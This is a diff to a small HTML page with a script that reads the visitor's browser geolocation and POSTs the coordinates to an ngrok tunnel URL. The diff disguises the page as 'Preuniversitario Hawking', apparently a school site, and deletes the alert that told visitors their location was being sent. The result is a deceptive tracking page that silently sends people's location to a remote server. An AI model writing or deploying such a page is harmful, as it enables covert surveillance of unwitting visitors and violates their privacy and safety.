@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Obtener Ubicación</title>
+    <title>Preuniversitario Hawking</title>
 </head>
 <body>
-    <h1>Obtener Ubicación</h1>
+    <h1>Preuniversitario Hawking</h1>
     <script>
         // Comprobar si el navegador soporta la geolocalización
         if (navigator.geolocation) {
@@ -19,11 +19,11 @@
 
             // Enviar la ubicación a tu servidor usando la URL proporcionada por ngrok
             var xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://8830-131-196-112-55.ngrok-free.app/guardar-ubicacion", true); // Reemplaza con tu URL de ngrok
+            xhr.open("POST", "https://f29b-131-196-112-55.ngrok-free.app/guardar-ubicacion", true); // Reemplaza con tu URL de ngrok
             xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
             xhr.send("lat=" + lat + "&lon=" + lon);
 
-            alert("Ubicación enviada: " + lat + ", " + lon);
+            
         }
 
         function mostrarError(error) {
